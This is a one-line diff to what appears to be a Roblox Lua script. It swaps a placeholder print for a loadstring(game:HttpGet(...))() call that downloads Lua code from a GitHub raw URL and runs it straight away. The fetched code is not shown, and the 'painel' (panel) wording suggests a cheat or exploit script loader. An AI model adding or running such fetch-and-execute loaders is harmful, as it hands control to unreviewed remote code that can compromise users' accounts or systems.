@@ -1,1 +1,1 @@
-print("loads aqui do painel")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Cat558-uz/7687/refs/heads/main/68e198b77f6a59f2.lua.txt"))()
